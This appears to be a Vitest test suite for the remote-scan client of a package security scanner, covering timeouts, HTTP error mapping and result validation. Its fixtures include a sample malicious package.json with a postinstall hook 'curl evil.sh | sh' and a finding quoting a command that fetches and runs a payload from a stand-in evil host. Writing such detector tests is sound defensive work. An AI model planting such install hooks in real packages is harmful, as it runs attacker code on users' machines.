import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { runRemoteScan, resolveManifestPath } from './remote-scan';
import { saveSession, fetchRemoteScan } from './cloud_client';
import type { Session } from './cloud_client';

function buildSession(token: string, overrides: Partial<Session> = {}): Session {
    return {
        token,
        user: 'octocat',
        subjectId: 'sub_123',
        plan: 'pro',
        planLabel: 'Pro',
        expiresAt: '2027-08-05T00:00:00.000Z',
        capabilities: {
            content_intel_lookup: true,
            remote_scan: true,
            oracle_integration: true,
            offline_sync: false,
            sbom: true,
            ai_review: false,
        },
        limits: { apiRequestsPerMonth: 10000, maxRepos: 25, retentionDays: 365 },
        fetchedAt: '2026-08-05T00:00:00.000Z',
        ...overrides,
    };
}

function makeTempDir(): string {
    return fs.mkdtempSync(path.join(os.tmpdir(), 'sentinel-remote-scan-sec-'));
}

function outputText(result: { lines: { text: string }[] }): string {
    return result.lines.map((l) => l.text).join('\n');
}

function writeManifest(dir: string): string {
    fs.writeFileSync(
        path.join(dir, 'package.json'),
        JSON.stringify({ name: 'evil-pkg', version: '1.0.0', scripts: { postinstall: 'curl evil.sh | sh' } }),
        'utf8'
    );
    return path.join(dir, 'package.json');
}

function scanBody(overrides: Record<string, unknown> = {}): Record<string, unknown> {
    return {
        status: 'complete',
        verdict: 'MALICIOUS',
        risk: 'critical',
        riskScore: 80,
        confidence: 0.85,
        engineVersion: '2.4.1',
        findings: [
            {
                severity: 'critical',
                title: 'postinstall',
                message: "High-risk script detected in 'postinstall'.",
                evidence: 'curl -s https://evil.example.com/payload.sh | sh',
            },
        ],
        ...overrides,
    };
}

function mockResponse(fetchMock: ReturnType<typeof vi.fn>, status: number, body: unknown): void {
    fetchMock.mockResolvedValue({
        ok: status >= 200 && status < 300,
        status,
        json: () => Promise.resolve(body),
    });
}

describe('fetchRemoteScan timeout (adversarial never-resolving server)', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it('aborts a request that never responds, falls back to local analysis, and preserves the session', async () => {
        const dir = makeTempDir();
        try {
            const sessionPath = path.join(dir, 'auth.json');
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            let capturedSignal: AbortSignal | undefined;
            fetchMock.mockImplementation((_url: string, init?: RequestInit) => {
                capturedSignal = init?.signal;
                return new Promise<Response>((_resolve, reject) => {
                    init?.signal?.addEventListener('abort', () => {
                        reject(new DOMException('The operation was aborted.', 'AbortError'));
                    });
                });
            });

            const started = Date.now();
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com', timeoutMs: 20 },
                { sessionDir: dir }
            );
            const elapsed = Date.now() - started;

            expect(elapsed).toBeLessThan(2000);
            expect(result.exitCode).toBe(0);
            expect(outputText(result)).toContain(
                'Cloud scan unavailable — continuing with local analysis.'
            );
            expect(fs.existsSync(sessionPath)).toBe(true);
            expect(capturedSignal?.aborted).toBe(true);
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });
});

describe('cloud_client remote-scan contract (static source guards)', () => {
    it('maps 401, 403, 429, 503, 400/413 to their kinds BEFORE the generic non-ok branch', () => {
        const src = fs.readFileSync(path.join(__dirname, 'cloud_client.ts'), 'utf8');
        const scanStart = src.indexOf('export async function fetchRemoteScan');
        const scanBlock = src.slice(scanStart);
        const authIdx = scanBlock.indexOf('res.status === 401');
        const forbiddenIdx = scanBlock.indexOf('res.status === 403');
        const quotaIdx = scanBlock.indexOf('res.status === 429');
        const busyIdx = scanBlock.indexOf('res.status === 503');
        const badRequestIdx = scanBlock.indexOf('res.status === 400 || res.status === 413');
        const genericIdx = scanBlock.indexOf('if (!res.ok)');
        expect(authIdx).toBeGreaterThan(-1);
        expect(forbiddenIdx).toBeGreaterThan(authIdx);
        expect(quotaIdx).toBeGreaterThan(forbiddenIdx);
        expect(busyIdx).toBeGreaterThan(quotaIdx);
        expect(badRequestIdx).toBeGreaterThan(busyIdx);
        expect(genericIdx).toBeGreaterThan(badRequestIdx);
    });

    it('POSTs to /api/scan/remote with a 20s AbortController timeout', () => {
        const src = fs.readFileSync(path.join(__dirname, 'cloud_client.ts'), 'utf8');
        const scanStart = src.indexOf('export async function fetchRemoteScan');
        const scanBlock = src.slice(scanStart);
        expect(src).toContain('const REMOTE_SCAN_TIMEOUT_MS = 20000;');
        expect(scanBlock).toContain("'/api/scan/remote'");
        expect(scanBlock).toContain('new AbortController()');
        expect(scanBlock).toMatch(/setTimeout\(\(\) => controller\.abort\(\), timeoutMs\)/);
        expect(scanBlock).toContain('signal: controller.signal');
        expect(scanBlock).toContain("body: JSON.stringify({ manifest, format })");
    });
});

describe('cloud_client fetchRemoteScan', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    const MANIFEST = JSON.stringify({ name: 'pkg', version: '1.0.0' });

    it('parses a complete result and POSTs to /api/scan/remote with the Bearer token', async () => {
        mockResponse(fetchMock, 200, scanBody());
        const result = await fetchRemoteScan(
            MANIFEST,
            'npm',
            'tok-1',
            'https://cloud.example.com'
        );
        expect(result.ok).toBe(true);
        if (result.ok) {
            expect(result.data.verdict).toBe('MALICIOUS');
            expect(result.data.risk).toBe('critical');
            expect(result.data.riskScore).toBe(80);
            expect(result.data.findings).toHaveLength(1);
        }
        const [url, init] = fetchMock.mock.calls[0];
        expect(url).toBe('https://cloud.example.com/api/scan/remote');
        const headers = (init as { headers: Record<string, string> }).headers;
        expect(headers.Authorization).toBe('Bearer tok-1');
        expect(headers['Content-Type']).toBe('application/json');
        const sentBody = JSON.parse((init as { body: string }).body);
        expect(sentBody.manifest).toBe(MANIFEST);
        expect(sentBody.format).toBe('npm');
    });

    it('maps 401 to kind auth', async () => {
        mockResponse(fetchMock, 401, { error: 'Invalid or expired API token.' });
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'bad', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('auth');
            expect(result.status).toBe(401);
        }
    });

    it('maps 403 to kind forbidden', async () => {
        mockResponse(fetchMock, 403, { error: 'Your plan does not include remote scanning.' });
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('forbidden');
            expect(result.error).toContain('remote scanning');
        }
    });

    it('maps 429 to kind quota and surfaces the server error', async () => {
        mockResponse(fetchMock, 429, { error: 'Monthly quota exhausted.' });
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('quota');
            expect(result.status).toBe(429);
            expect(result.error).toBe('Monthly quota exhausted.');
        }
    });

    it('maps 503 to kind busy', async () => {
        mockResponse(fetchMock, 503, { error: 'engine overloaded' });
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('busy');
    });

    it('maps 400 and 413 to kind bad_request with the server error', async () => {
        mockResponse(fetchMock, 413, { error: 'Manifest exceeds the size limit.' });
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) {
            expect(result.kind).toBe('bad_request');
            expect(result.error).toContain('size limit');
        }
    });

    it('rejects a 200 body that fails structural validation as kind network', async () => {
        mockResponse(fetchMock, 200, { status: 'complete', verdict: 'MALICIOUS' });
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('rejects a 200 body with an invalid verdict or risk as kind network', async () => {
        mockResponse(fetchMock, 200, scanBody({ verdict: 'WEIRD', risk: 'extreme' }));
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('rejects a 200 body with out-of-range riskScore or confidence', async () => {
        mockResponse(fetchMock, 200, scanBody({ riskScore: 150 }));
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('rejects a 200 body with a finding missing its title', async () => {
        mockResponse(fetchMock, 200, scanBody({ findings: [{ severity: 'critical' }] }));
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('maps network failure to kind network without throwing', async () => {
        fetchMock.mockRejectedValue(new Error('fetch failed: ECONNREFUSED'));
        const result = await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com');
        expect(result.ok).toBe(false);
        if (!result.ok) expect(result.kind).toBe('network');
    });

    it('strips trailing slashes from the base URL', async () => {
        mockResponse(fetchMock, 200, scanBody());
        await fetchRemoteScan(MANIFEST, 'npm', 'tok-1', 'https://cloud.example.com///');
        expect(fetchMock.mock.calls[0][0]).toBe(
            'https://cloud.example.com/api/scan/remote'
        );
    });
});

describe('remote-scan path resolution', () => {
    it('accepts a package.json file, a directory containing one, and rejects empty dirs / non-package files', () => {
        const dir = makeTempDir();
        try {
            const manifestPath = writeManifest(dir);
            expect(resolveManifestPath(manifestPath)).toBe(
                path.resolve(manifestPath)
            );
            expect(resolveManifestPath(dir)).toBe(path.resolve(manifestPath));
            expect(resolveManifestPath(path.join(dir, 'does-not-exist'))).toBeNull();

            const empty = makeTempDir();
            try {
                expect(resolveManifestPath(empty)).toBeNull();
            } finally {
                fs.rmSync(empty, { recursive: true, force: true });
            }

            const other = path.join(dir, 'readme.txt');
            fs.writeFileSync(other, 'hello', 'utf8');
            expect(resolveManifestPath(other)).toBeNull();
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });
});

describe('remote-scan result passthrough pins (documenting current behavior)', () => {
    let fetchMock: ReturnType<typeof vi.fn>;

    beforeEach(() => {
        fetchMock = vi.fn();
        vi.stubGlobal('fetch', fetchMock);
    });

    afterEach(() => {
        vi.unstubAllGlobals();
    });

    it('--json emits every server field verbatim, including unexpected ones (no whitelisting)', async () => {
        const dir = makeTempDir();
        try {
            saveSession(buildSession('tok-1'), { sessionDir: dir });
            writeManifest(dir);
            mockResponse(
                fetchMock,
                200,
                scanBody({ engineVersion: '2.4.1', scanDurationMs: 412, rawAlerts: ['x'] })
            );
            const result = await runRemoteScan(
                { targetPath: dir, api: 'https://cloud.example.com', json: true },
                { sessionDir: dir }
            );
            expect(result.exitCode).toBe(0);
            const parsed = JSON.parse(outputText(result));
            expect(parsed.scanDurationMs).toBe(412);
            expect(parsed.rawAlerts).toEqual(['x']);
            expect(parsed.verdict).toBe('MALICIOUS');
        } finally {
            fs.rmSync(dir, { recursive: true, force: true });
        }
    });
});
